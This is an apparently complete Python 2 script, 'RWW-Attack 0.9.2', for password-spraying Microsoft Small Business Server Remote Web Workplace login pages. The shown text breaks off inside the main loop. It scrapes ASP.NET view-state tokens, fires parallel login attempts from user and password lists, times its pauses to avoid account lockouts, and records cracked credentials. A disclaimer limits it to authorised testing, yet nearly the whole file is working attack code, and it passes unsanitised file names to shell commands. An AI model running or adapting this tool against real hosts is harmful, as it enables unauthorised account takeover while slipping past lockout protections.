#!/usr/bin/python

import os, pycurl, sys, getopt, time, string

def clear_cookies():
	try:
		os.system("rm /tmp/rww-cookies.txt")
	except:
		print ""	

def sleep():
	n = duration*60
	print "lockout threshold hit.."
	while n > 0:
		print "sleeping " + str(n) + " seconds"
		time.sleep(1)
		n =n -1


def init_threads():
	global m, a, b, c, d, e

	a = pycurl.Curl()
	b = pycurl.Curl()
	c = pycurl.Curl()
	d = pycurl.Curl()
	e = pycurl.Curl()
	m = pycurl.CurlMulti()

	a.setopt(pycurl.SSL_VERIFYPEER,0)
	a.setopt(pycurl.SSL_VERIFYHOST,0)
	a.setopt(pycurl.FOLLOWLOCATION,1)
	a.setopt(pycurl.USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.2)")
	a.setopt(pycurl.COOKIEFILE, "/tmp/rww-cookies.txt")
	a.setopt(pycurl.COOKIEJAR, "/tmp/rww-cookies.txt")
	a.setopt(pycurl.VERBOSE, 0)
	a.setopt(pycurl.TIMEOUT, toutvalue)	

	b.setopt(pycurl.SSL_VERIFYPEER,0)
	b.setopt(pycurl.SSL_VERIFYHOST,0)
	b.setopt(pycurl.FOLLOWLOCATION,1)
	b.setopt(pycurl.USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.2)")
	b.setopt(pycurl.COOKIEFILE, "/tmp/rww-cookies.txt")
	b.setopt(pycurl.COOKIEJAR, "/tmp/rww-cookies.txt")
	b.setopt(pycurl.VERBOSE, 0)
	b.setopt(pycurl.TIMEOUT, toutvalue)	

	c.setopt(pycurl.SSL_VERIFYPEER,0)
	c.setopt(pycurl.SSL_VERIFYHOST,0)
	c.setopt(pycurl.FOLLOWLOCATION,1)
	c.setopt(pycurl.USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.2)")
	c.setopt(pycurl.COOKIEFILE, "/tmp/rww-cookies.txt")
	c.setopt(pycurl.COOKIEJAR, "/tmp/rww-cookies.txt")
	c.setopt(pycurl.VERBOSE, 0)
	c.setopt(pycurl.TIMEOUT, toutvalue)	

	d.setopt(pycurl.SSL_VERIFYPEER,0)
	d.setopt(pycurl.SSL_VERIFYHOST,0)
	d.setopt(pycurl.FOLLOWLOCATION,1)
	d.setopt(pycurl.USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.2)")
	d.setopt(pycurl.COOKIEFILE, "/tmp/rww-cookies.txt")
	d.setopt(pycurl.COOKIEJAR, "/tmp/rww-cookies.txt")
	d.setopt(pycurl.VERBOSE, 0)
	d.setopt(pycurl.TIMEOUT, toutvalue)	

	e.setopt(pycurl.SSL_VERIFYPEER,0)
	e.setopt(pycurl.SSL_VERIFYHOST,0)
	e.setopt(pycurl.FOLLOWLOCATION,1)
	e.setopt(pycurl.USERAGENT, "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.2)")
	e.setopt(pycurl.COOKIEFILE, "/tmp/rww-cookies.txt")
	e.setopt(pycurl.COOKIEJAR, "/tmp/rww-cookies.txt")
	e.setopt(pycurl.VERBOSE, 0)
	e.setopt(pycurl.TIMEOUT, toutvalue)
	
def grab_viewstate_evs():
	global m, a, b, c, d, e
	a.setopt(pycurl.URL, VSurl)
	a.setopt(pycurl.WRITEFUNCTION, grab_viewstates_and_evs_threada)
			
	b.setopt(pycurl.URL, VSurl)
	b.setopt(pycurl.WRITEFUNCTION, grab_viewstates_and_evs_threadb)

	c.setopt(pycurl.URL, VSurl)
	c.setopt(pycurl.WRITEFUNCTION, grab_viewstates_and_evs_threadc)

	d.setopt(pycurl.URL, VSurl)
	d.setopt(pycurl.WRITEFUNCTION, grab_viewstates_and_evs_threadd)

	e.setopt(pycurl.URL, VSurl)
	e.setopt(pycurl.WRITEFUNCTION, grab_viewstates_and_evs_threade)
			

	m.add_handle(a)
	m.add_handle(b)
	m.add_handle(c)
	m.add_handle(d)
	m.add_handle(e)
	
	handles = 5
	while handles:
        	while 1:
                	ret, handles = m.perform()
			if ret != pycurl.E_CALL_MULTI_PERFORM:
                        	break
        	m.select(1.0)
			
	m.close()


def close_threads():
	global a, b, c, d, e
	try:
		a.close()
		b.close()
		c.close()
		d.close()
		e.close()	
	except:
		print ""
def Results():
	if len(Success_Passwd_List) == 0:
		print "No passwords worked!"
		sys.exit()
	
	
	print "=======================Results======================="
	for n in range (len(Success_Passwd_List)):
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%25','%')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('+',' ')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%21','!')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%22','\x22')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%23','\x23')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%24','$')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%26','&')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%27','\x27')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%28','(')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%29',')')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%2B','+')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%2C',',')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%2F','/')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%3A',':')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%3B',';')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%3C','<')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%3D','=')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%3E','>')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%3F','?')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%40','@')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%5B','[')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%5C','\x5c')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%5D',']')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%5E','^')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%60','`')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%7B','{')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%7C','|')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%7D','}')
		Success_Passwd_List[n] = Success_Passwd_List[n].replace('%7E','~')		
		print "Username: "+Success_User_List[n] + " | Password: "+Success_Passwd_List[n]
	print "Total passwords found: " + str(len(Success_Passwd_List))
	print "======================================================"	
	
	if use_oF == 1:
		try:
			temp = open (output_file, 'w')
			temp.write("========================Results======================\r\n")
			for n in range (len(Success_Passwd_List)):
				
				temp.write("Username: "+Success_User_List[n] + " | Password: "+Success_Passwd_List[n]+'\r\n')
				temp.write("\r\n")
			temp.write("Total passwords found: " + str(len(Success_Passwd_List))+'\r\n')
			temp.write("=====================================================\r\n")
			temp.close()
			print "results successfully written to: "+ output_file
		except:
			print "error in writing output file!"

	sys.exit()

	

def grab_viewstates_and_evs_threada(contents):
	if cougar_mode ==0:
		start = 9
	else:
		start = 26
	global session_viewstate_a
	global session_ev_validation_a
	if string.find(contents, "__VIEWSTATE") > 1:		
		session_viewstate_a = contents.partition("__VIEWSTATE")
		length_of_vs = 26
		length_found = 0
		while length_found == 0:
			if session_viewstate_a[2][length_of_vs:length_of_vs+1] == ' ':
				length_found = 1
			length_of_vs = length_of_vs + 1

		session_viewstate_a = session_viewstate_a[2][start:length_of_vs-2]
		session_viewstate_a = session_viewstate_a.replace('+','%2B')
        	session_viewstate_a = session_viewstate_a.replace('/','%2F')
		session_viewstate_a = session_viewstate_a.replace('=','%3D')

		
	if cougar_mode == 1:
		if string.find(contents, "__EVENTVALIDATION") > 1:
			session_ev_validation_a =  contents.partition("__EVENTVALIDATION")
			length_of_ev_val = 32
			length_found = 0
			while length_found == 0:
				if session_ev_validation_a[2][length_of_ev_val:length_of_ev_val+1] == ' ':
					length_found = 1
				length_of_ev_val = length_of_ev_val +1
		
			session_ev_validation_a = session_ev_validation_a[2][32:length_of_ev_val-2]
			session_ev_validation_a = session_ev_validation_a.replace('+','%2B')
        		session_ev_validation_a = session_ev_validation_a.replace('/','%2F')
			session_ev_validation_a = session_ev_validation_a.replace('=','%3D')
			
			
			
def grab_viewstates_and_evs_threadb(contents):
	if cougar_mode ==0:
		start = 9
	else:
		start = 26
	global session_viewstate_b
	global session_ev_validation_b
	if string.find(contents, "__VIEWSTATE") > 1:		
		session_viewstate_b = contents.partition("__VIEWSTATE")
		length_of_vs = 26
		length_found = 0
		while length_found == 0:
			if session_viewstate_b[2][length_of_vs:length_of_vs+1] == ' ':
				length_found = 1
			length_of_vs = length_of_vs + 1

		session_viewstate_b = session_viewstate_b[2][start:length_of_vs-2]
		session_viewstate_b = session_viewstate_b.replace('+','%2B')
        	session_viewstate_b = session_viewstate_b.replace('/','%2F')
		session_viewstate_b = session_viewstate_b.replace('=','%3D')
	if cougar_mode ==1:
		if string.find(contents, "__EVENTVALIDATION") > 1:
			session_ev_validation_b =  contents.partition("__EVENTVALIDATION")
			length_of_ev_val = 32
			length_found = 0
			while length_found == 0:
				if session_ev_validation_b[2][length_of_ev_val:length_of_ev_val+1] == ' ':
					length_found = 1
				length_of_ev_val = length_of_ev_val +1
		
			session_ev_validation_b = session_ev_validation_b[2][32:length_of_ev_val-2]
			session_ev_validation_b = session_ev_validation_b.replace('+','%2B')
        		session_ev_validation_b = session_ev_validation_b.replace('/','%2F')
			session_ev_validation_b = session_ev_validation_b.replace('=','%3D')
				
		
def grab_viewstates_and_evs_threadc(contents):
	global session_viewstate_c
	global session_ev_validation_c
	if cougar_mode ==0:
		start = 9
	else:
		start = 26	
	if string.find(contents, "__VIEWSTATE") > 1:
		session_viewstate_c = contents.partition("__VIEWSTATE")
		length_of_vs = 26
		length_found = 0
		while length_found == 0:
			if session_viewstate_c[2][length_of_vs:length_of_vs+1] == ' ':
				length_found = 1
			length_of_vs = length_of_vs + 1

		session_viewstate_c = session_viewstate_c[2][start:length_of_vs-2]
		session_viewstate_c = session_viewstate_c.replace('+','%2B')
        	session_viewstate_c = session_viewstate_c.replace('/','%2F')
		session_viewstate_c = session_viewstate_c.replace('=','%3D')
	
	if cougar_mode ==1:
		if string.find(contents, "__EVENTVALIDATION") > 1:
			session_ev_validation_c =  contents.partition("__EVENTVALIDATION")
			length_of_ev_val = 32
			length_found = 0
			while length_found == 0:
				if session_ev_validation_c[2][length_of_ev_val:length_of_ev_val+1] == ' ':
					length_found = 1
				length_of_ev_val = length_of_ev_val +1
		
			session_ev_validation_c = session_ev_validation_c[2][32:length_of_ev_val-2]
			session_ev_validation_c = session_ev_validation_c.replace('+','%2B')
        		session_ev_validation_c = session_ev_validation_c.replace('/','%2F')
			session_ev_validation_c = session_ev_validation_c.replace('=','%3D')
			


def grab_viewstates_and_evs_threadd(contents):
	global session_viewstate_d
	global session_ev_validation_d	
	if cougar_mode ==0:
		start = 9
	else:
		start = 26
	if string.find(contents, "__VIEWSTATE") > 1:		
		session_viewstate_d = contents.partition("__VIEWSTATE")
		length_of_vs = 26
		length_found = 0
		while length_found == 0:
			if session_viewstate_d[2][length_of_vs:length_of_vs+1] == ' ':
				length_found = 1
			length_of_vs = length_of_vs + 1

		session_viewstate_d = session_viewstate_d[2][start:length_of_vs-2]
		session_viewstate_d = session_viewstate_d.replace('+','%2B')
        	session_viewstate_d = session_viewstate_d.replace('/','%2F')
		session_viewstate_d = session_viewstate_d.replace('=','%3D')
	if cougar_mode ==1:
		if string.find(contents, "__EVENTVALIDATION") > 1:
			session_ev_validation_d =  contents.partition("__EVENTVALIDATION")
			length_of_ev_val = 32
			length_found = 0
			while length_found == 0:
				if session_ev_validation_d[2][length_of_ev_val:length_of_ev_val+1] == ' ':
					length_found = 1
				length_of_ev_val = length_of_ev_val +1
		
			session_ev_validation_d = session_ev_validation_d[2][32:length_of_ev_val-2]
			session_ev_validation_d = session_ev_validation_d.replace('+','%2B')
        		session_ev_validation_d = session_ev_validation_d.replace('/','%2F')
			session_ev_validation_d = session_ev_validation_d.replace('=','%3D')
			
			
def grab_viewstates_and_evs_threade(contents):
	global session_viewstate_e
	global session_ev_validation_e
	if cougar_mode ==0:
		start = 9
	else:
		start = 26
	if string.find(contents, "__VIEWSTATE") > 1:		
		session_viewstate_e = contents.partition("__VIEWSTATE")
		length_of_vs = 26
		length_found = 0
		while length_found == 0:
			if session_viewstate_e[2][length_of_vs:length_of_vs+1] == ' ':
				length_found = 1
			length_of_vs = length_of_vs + 1

		session_viewstate_e = session_viewstate_e[2][start:length_of_vs-2]
		session_viewstate_e = session_viewstate_e.replace('+','%2B')
        	session_viewstate_e = session_viewstate_e.replace('/','%2F')
		session_viewstate_e = session_viewstate_e.replace('=','%3D')
	if cougar_mode ==1:
		if string.find(contents, "__EVENTVALIDATION") > 1:
			session_ev_validation_e =  contents.partition("__EVENTVALIDATION")
			length_of_ev_val = 32
			length_found = 0
			while length_found == 0:
				if session_ev_validation_e[2][length_of_ev_val:length_of_ev_val+1] == ' ':
					length_found = 1
				length_of_ev_val = length_of_ev_val +1
		
			session_ev_validation_e = session_ev_validation_e[2][32:length_of_ev_val-2]
			session_ev_validation_e = session_ev_validation_e.replace('+','%2B')
        		session_ev_validation_e = session_ev_validation_e.replace('/','%2F')
			session_ev_validation_e = session_ev_validation_e.replace('=','%3D')
			
			
def check_results_thread_a(contents):
	global success_id_handler
	if string.find(contents, "This HTML frameset displays multiple Web pages. To view this frameset, use") > 1:
		success_id_handler = "threada"
	if string.find(contents, "Signed in as:") > 1:
		success_id_handler = "threada"

def check_results_thread_b(contents):
	global success_id_handler
	if string.find(contents, "This HTML frameset displays multiple Web pages. To view this frameset, use") > 1:
		success_id_handler = "threadb"
	if string.find(contents, "Signed in as:") > 1:
		success_id_handler = "threadb"
	
def check_results_thread_c(contents):
	global success_id_handler
	if string.find(contents, "This HTML frameset displays multiple Web pages. To view this frameset, use") > 1:
		success_id_handler = "threadc"
	if string.find(contents, "Signed in as:") > 1:
		success_id_handler = "threadc"


def check_results_thread_d(contents):
	global success_id_handler
	if string.find(contents, "This HTML frameset displays multiple Web pages. To view this frameset, use") > 1:
		success_id_handler = "threadd"
	if string.find(contents, "Signed in as:") > 1:
		success_id_handler = "threadd"

def check_results_thread_e(contents):
	global success_id_handler
	if string.find(contents, "This HTML frameset displays multiple Web pages. To view this frameset, use") > 1:
		success_id_handler = "threade"
	if string.find(contents, "Signed in as:") > 1:
		success_id_handler = "threade"

def banner():
	os.system("clear")
	print "===================================================================="
	print "#                        RWW-Attack 0.9.2                          #"
	print "#                        coded by Bruk0ut                          #"
	print "#                                                                  #"
	print "#         bugs/comments to mikey27 ..:<-at->:.. hotmail.com        #"
	print "# greetz fly out to offsec,remote-exploit,hak5 & authors of pycurl #"
	print "===================================================================="
	print "Disclaimer:"
	print "This program is to be used only with permission of the owner of the target host and is for use in penetration testing only. If this is not the case you must stop using this program now!"
	print ""
	
def usage():
	print sys.argv[0] + " -t 192.168.153.2 -u users.txt -p passwds.txt"
	print ""
	print "-t specifies host. use hostname/IP only, not full RWW URL."
	print "-u <user list> E.G users.txt"
	print "-p <passwd list> E.G passwds.txt"
	print "-l specifies lockout threshold (for invalid login attempts). Use this value to specify the number of passwords to try against each user until sleeping to avoid locking out users. Default SBS 2003 lockout values are set if not specified (lockout threshold - 45 invalid attempts, lockout duration/reset counter - 10 mins.)"
	print "-d specifies lockout duration/reset counter in MINUTES. Default SBS 2003 lockout duration value is set if not specified (10 mins)."
	print "-c specifies if targetting a SBS 2008 (aka cougar) host."
	print "-o <output file> specifies whether to save succesful results to file." 
	print ""
	
def load_passwords():
	try:
		global Passwd_List
		os.system("unix2dos "+Passwd_List_File)
		os.system("dos2unix "+Passwd_List_File)
		passwds = open(Passwd_List_File,'r')
		print "Loading Passwords..."
		for passwd in passwds.read().split('\n'):
			if passwd != '':
				passwd = passwd.replace('%','%25')
				passwd = passwd.replace(' ','+')
				passwd = passwd.replace('!','%21')
				passwd = passwd.replace('\x22','%22')
				passwd = passwd.replace('\x23','%23')
				passwd = passwd.replace('$','%24')
				passwd = passwd.replace('&','%26')
				passwd = passwd.replace('\x27','%27')
				passwd = passwd.replace('(','%28')
				passwd = passwd.replace(')','%29')
				passwd = passwd.replace('+','%2B')
				passwd = passwd.replace(',','%2C')
				passwd = passwd.replace('/','%2F')
				passwd = passwd.replace(':','%3A')
				passwd = passwd.replace(';','%3B')
				passwd = passwd.replace('<','%3C')
				passwd = passwd.replace('=','%3D')
				passwd = passwd.replace('>','%3E')
				passwd = passwd.replace('?','%3F')
				passwd = passwd.replace('@','%40')
				passwd = passwd.replace('[','%5B')
				passwd = passwd.replace('\x5c','%5C')
				passwd = passwd.replace(']','%5D')
				passwd = passwd.replace('^','%5E')
				passwd = passwd.replace('`','%60')
				passwd = passwd.replace('{','%7B')
				passwd = passwd.replace('|','%7C')
				passwd = passwd.replace('}','%7D')
				passwd = passwd.replace('~','%7E')
				Passwd_List.append(passwd)				
		passwds.close()
		if len(Passwd_List)%5 !=0:
			print "padding end of password list to make %5 for threads"
			while len(Passwd_List)%5 != 0:
				Passwd_List.append("")
			print "Passwd list now: "+str(len(Passwd_List))
		print str(len(Passwd_List)) + " Passwords Loaded"
	except:
		print "Error loading Password list... check filename/path of passwds file"		
		sys.exit()
		
def load_users():
		try:
			global Users_List
			os.system("unix2dos "+User_List_File)
			os.system("dos2unix "+User_List_File)
			Users = open(User_List_File,'r')
			print "Loading Users..."
			for User in Users.read().split('\n'):
				if User != '':
					User = User.replace('%','%25')
					User = User.replace(' ','+')
					User = User.replace('!','%21')
					User = User.replace('\x22','%22')
					User = User.replace('\x23','%23')
					User = User.replace('$','%24')
					User = User.replace('&','%26')
					User = User.replace('\x27','%27')
					User = User.replace('(','%28')
					User = User.replace(')','%29')
					User = User.replace('+','%2B')
					User = User.replace(',','%2C')
					User = User.replace('/','%2F')
					User = User.replace(':','%3A')
					User = User.replace(';','%3B')
					User = User.replace('<','%3C')
					User = User.replace('=','%3D')
					User = User.replace('>','%3E')
					User = User.replace('?','%3F')
					User = User.replace('@','%40')
					User = User.replace('[','%5B')
					User = User.replace('\x5c','%5C')
					User = User.replace(']','%5D')
					User = User.replace('^','%5E')
					User = User.replace('`','%60')
					User = User.replace('{','%7B')
					User = User.replace('|','%7C')
					User = User.replace('}','%7D')
					User = User.replace('~','%7E')
					Users_List.append(User)
			Users.close()
			if len(Users_List) == 0:
				print "No users found in userlist! check contents..."
				sys.exit()
			print str(len(Users_List)) + " Users Loaded"
		except:
			os.system("clear")
			print "Error loading Username list... check filename/path of users file."
			usage()
			sys.exit()

def check_args(argv):
	try:
		opts, args = getopt.getopt(argv, 'hcl:d:t:u:p:o:')
	except getopt.GetoptError:
		usage()
		sys.exit()

	for opt, arg in opts:
		
		if opt in ('-h'):
			usage()
			sys.exit()
						
		if opt in ('-l'):
			global thold
			arg = int(arg)
			if arg %5 != 0:
				print "subtracting from lockout threshold limit to make %5 for threads"
				while arg%5 !=0:
					arg = arg -1
			print "lockout threshold set to " + str(arg)
			thold = arg
			
		if opt in ('-d'):
			global duration
			duration = int(arg)
			print "lockout counter reset set to " + str(arg) + " mins"
		elif opt == '-t':
			global host
			host = arg
			if string.find(host, "/remote") > 1:
				os.system("clear")
				print "Specify target host as domain name/IP ONLY, eg, 192.168.153.2 - DO NOT specify full Remote Web Workplace URL"
				sys.exit() 
			elif string.find(host, "/Remote") > 1:
				os.system("clear")
				print "Specify target host as domain name/IP ONLY, eg, 192.168.153.2 - DO NOT specify full Remote Web Workplace URL"
				sys.exit()
				
			elif string.find(host, "http") > -1:
				os.system("clear")				
				print "Specify target host as domain name/IP ONLY, eg, 192.168.153.2 - DO NOT specify full Remote Web Workplace URL"
				sys.exit()
			elif string.find(host, "HTTP") > -1:
				os.system("clear")				
				print "Specify target host as domain name/IP ONLY, eg, 192.168.153.2 - DO NOT specify full Remote Web Workplace URL"
				sys.exit()
			

		elif opt == '-u': 
			global User_List_File
			User_List_File = arg

		elif opt == '-p':
			global Passwd_List_File
			Passwd_List_File = arg
		elif opt == '-o':
			global use_oF
			global output_file
			use_oF = 1
			output_file = arg
		elif opt == '-c':
			global cougar_mode
			global toutvalue
			cougar_mode = 1
			toutvalue = 300
			print "SBS 2008 (Cougar) Mode Invoked!"
			
				
if __name__ == "__main__":
	host = ''
	use_oF = 0
	Passwd_List = []
	Users_List = []
	cougar_mode = 0
	use_digits = 0
	Success_User_List = []
	Success_Passwd_List = []
	running_pass_count = 0
	last_lck_threshold = 0
	temp_pass_count = 0
	all_ran_through = 0 
	pass_count_against_user = 0
	n = 0
	thold = 45
	duration = 10
	toutvalue = 120
	temp_pass_count_2 = 0
	banner()
	check_args(sys.argv[1:])
	if host == '':
		usage()
		sys.exit()
	clear_cookies()
	load_users()
	load_passwords()
	VSurl = 'https://'+host+ '/Remote'
	Turl = 'https://'+host+ '/Remote/logon.aspx?ReturnUrl=%2fremote%2fdefault.aspx'
	Lurl_2k3 = 'https://'+host+ '/Remote/signout.aspx'
	Lurl_2k8 = 'https://'+host+ '/Remote/logoff.aspx'

		
	init_threads()
	grab_viewstate_evs()
	init_threads()
	while 1:
		success_id_handler = ""			
		if all_ran_through == 1 and temp_pass_count != len(Passwd_List):
			all_ran_through = 0 
			last_lck_threshold = last_lck_threshold + thold
			pass_count_against_user = last_lck_threshold
			temp_pass_count = last_lck_threshold
			if temp_pass_count < (len(Passwd_List)):
				sleep()			
		
		if n == len(Users_List) and temp_pass_count >= len(Passwd_List):
			break
																		
		if n >= len(Users_List) and temp_pass_count != len(Passwd_List):
			os.system("clear")
			if len(Success_User_List) > 0:
				for q in range (len(Success_User_List)):
					print "Username: "+Success_User_List[q] + " | Password: "+Success_Passwd_List[q]		
			print "cycling users after lockout duration sleep"
			print str(len(Passwd_List)-temp_pass_count) + " passes still to try against " + str(len(Users_List)) + " users."
			n = 0
			init_threads()
			grab_viewstate_evs()
		if len(Users_List) == 0:
			print "all users cracked"
			break							
		print "total passes tried: " + str(running_pass_count) + "     total successes : " + str(len(Success_User_List))
							
		while temp_pass_count < (len(Passwd_List)) and all_ran_through != 1:																	 
			init_threads()
			try:
				if cougar_mode == 0:
				
					postdataa = "__VIEWSTATE="+session_viewstate_a+"&txtUserName="+Users_List[n]+"&txtUserPass="+Passwd_List[temp_pass_count]+"&cmdLogin=Log+On&listSpeed=Broadband&checkPublic=on"
					threada_current_pass = Passwd_List[temp_pass_count]
					postdatab = "__VIEWSTATE="+session_viewstate_b+"&txtUserName="+Users_List[n]+"&txtUserPass="+Passwd_List[temp_pass_count+1]+"&cmdLogin=Log+On&listSpeed=Broadband&checkPublic=on"	
					threadb_current_pass = Passwd_List[temp_pass_count+1]
					postdatac = "__VIEWSTATE="+session_viewstate_c+"&txtUserName="+Users_List[n]+"&txtUserPass="+Passwd_List[temp_pass_count+2]+"&cmdLogin=Log+On&listSpeed=Broadband&checkPublic=on"	
					threadc_current_pass = Passwd_List[temp_pass_count+2]
					postdatad = "__VIEWSTATE="+session_viewstate_d+"&txtUserName="+Users_List[n]+"&txtUserPass="+Passwd_List[temp_pass_count+3]+"&cmdLogin=Log+On&listSpeed=Broadband&checkPublic=on"			
					threadd_current_pass = Passwd_List[temp_pass_count+3]
					postdatae = "__VIEWSTATE="+session_viewstate_e+"&txtUserName="+Users_List[n]+"&txtUserPass="+Passwd_List[temp_pass_count+4]+"&cmdLogin=Log+On&listSpeed=Broadband&checkPublic=on"				
					threade_current_pass = Passwd_List[temp_pass_count+4]
				else:
				
					postdataa = '__VIEWSTATE='+session_viewstate_a+'&username='+Users_List[n]+'&password='+Passwd_List[temp_pass_count]+'&password2=Password&cmdLogin.x=0&cmdLogin.y=0&__EVENTVALIDATION='+session_ev_validation_a
					threada_current_pass = Passwd_List[temp_pass_count]
					postdatab = "__VIEWSTATE="+session_viewstate_b+"&username="+Users_List[n]+"&password="+Passwd_List[temp_pass_count+1]+"&password2=Password&cmdLogin.x=0&cmdLogin.y=0&__EVENTVALIDATION="+session_ev_validation_b
					threadb_current_pass = Passwd_List[temp_pass_count+1]
					postdatac = "__VIEWSTATE="+session_viewstate_c+"&username="+Users_List[n]+"&password="+Passwd_List[temp_pass_count+2]+"&password2=Password&cmdLogin.x=0&cmdLogin.y=0&__EVENTVALIDATION="+session_ev_validation_c				
					threadc_current_pass = Passwd_List[temp_pass_count+2]
					postdatad = "__VIEWSTATE="+session_viewstate_d+"&username="+Users_List[n]+"&password="+Passwd_List[temp_pass_count+3]+"&password2=Password&cmdLogin.x=0&cmdLogin.y=0&__EVENTVALIDATION="+session_ev_validation_d
					threadd_current_pass = Passwd_List[temp_pass_count+3]
					postdatae = "__VIEWSTATE="+session_viewstate_e+"&username="+Users_List[n]+"&password="+Passwd_List[temp_pass_count+4]+"&password2=Password&cmdLogin.x=0&cmdLogin.y=0&__EVENTVALIDATION="+session_ev_validation_e
					threade_current_pass = Passwd_List[temp_pass_count+4]
			except:
				print "problem retrieving data from host... check target hostname!"
				sys.exit()
					
			a.setopt(pycurl.URL, Turl)
			a.setopt(pycurl.POSTFIELDS, postdataa)
			a.setopt(pycurl.WRITEFUNCTION, check_results_thread_a)
			
			
			b.setopt(pycurl.URL, Turl)
			b.setopt(pycurl.POSTFIELDS, postdatab)
			b.setopt(pycurl.WRITEFUNCTION, check_results_thread_b)

			

			c.setopt(pycurl.URL, Turl)			
			c.setopt(pycurl.POSTFIELDS, postdatac)
			c.setopt(pycurl.WRITEFUNCTION, check_results_thread_c)


			d.setopt(pycurl.URL, Turl)
			d.setopt(pycurl.POSTFIELDS, postdatad)
			d.setopt(pycurl.WRITEFUNCTION, check_results_thread_d)


			e.setopt(pycurl.URL, Turl)
			e.setopt(pycurl.POSTFIELDS, postdatae)
			e.setopt(pycurl.WRITEFUNCTION, check_results_thread_e)


			m.add_handle(a)
			m.add_handle(b)
			m.add_handle(c)
			m.add_handle(d)
			m.add_handle(e)

			handles = 5
			while handles:
				while 1:	
					ret, handles = m.perform()
					sys.stdout.write("working...\r")
					if ret != pycurl.E_CALL_MULTI_PERFORM:
                        			break		
					sys.stdout.write("working---\r")
				m.select(1.0)

			
			m.close() 
			running_pass_count = running_pass_count + 5
			pass_count_against_user = pass_count_against_user + 5			
			temp_pass_count = temp_pass_count + 5
			temp_pass_count_2 = temp_pass_count_2 + 5
	
			if success_id_handler == 'threada':
				print "Success!! - Username: "+Users_List[n] + " ----> Password: "+ threada_current_pass
				print "Logging out of Remote Web Workplace..."
				Success_User_List.append(Users_List[n])
				Success_Passwd_List.append(threada_current_pass)
				if cougar_mode == 0:
					a.setopt(pycurl.URL, Lurl_2k3)
				else:
					a.setopt(pycurl.URL, Lurl_2k8)
				a.perform()
				if n == len(Users_List)-1 and pass_count_against_user == last_lck_threshold + thold:	
					all_ran_through = 1				
				
				if n == len(Users_List)-1 and temp_pass_count == len(Passwd_List):
					break				
				
				if all_ran_through == 1:
					print ""
				else:
					temp_pass_count = temp_pass_count - temp_pass_count_2
					pass_count_against_user = pass_count_against_user - temp_pass_count_2					
				
				Users_List.pop(n)
				init_threads()
				grab_viewstate_evs()
				break

			elif success_id_handler == 'threadb':
				print "Success!! - Username: "+Users_List[n] + " ----> Password: "+ threadb_current_pass
				print "Logging out of Remote Web Workplace..."
				Success_User_List.append(Users_List[n])
				Success_Passwd_List.append(threadb_current_pass)
				if cougar_mode == 0:
					b.setopt(pycurl.URL, Lurl_2k3)
				else:
					b.setopt(pycurl.URL, Lurl_2k8)
				b.perform()
				
				if n == len(Users_List)-1 and pass_count_against_user == last_lck_threshold + thold:	
					all_ran_through = 1				
				
				if n == len(Users_List)-1 and temp_pass_count == len(Passwd_List):
					break				
				
				if all_ran_through == 1:
					print ""
				else:
					temp_pass_count = temp_pass_count - temp_pass_count_2
					pass_count_against_user = pass_count_against_user - temp_pass_count_2					
				init_threads()
				grab_viewstate_evs()			
				Users_List.pop(n)
				break
				
			elif success_id_handler == 'threadc':
				print "Success!! - Username: "+Users_List[n] + " ----> Password: "+ threadc_current_pass
				print "Logging out of Remote Web Workplace..."
				Success_User_List.append(Users_List[n])
				Success_Passwd_List.append(threadc_current_pass)
				if cougar_mode == 0:
					c.setopt(pycurl.URL, Lurl_2k3)
				else:
					c.setopt(pycurl.URL, Lurl_2k8)
				c.perform()
				if n == len(Users_List)-1 and pass_count_against_user == last_lck_threshold + thold:	
					all_ran_through = 1				
				
				
				if n == len(Users_List)-1 and temp_pass_count == len(Passwd_List):
					break				
				
				
				if all_ran_through == 1:
					print ""
				else:
					temp_pass_count = temp_pass_count - temp_pass_count_2
					pass_count_against_user = pass_count_against_user - temp_pass_count_2						
				init_threads()
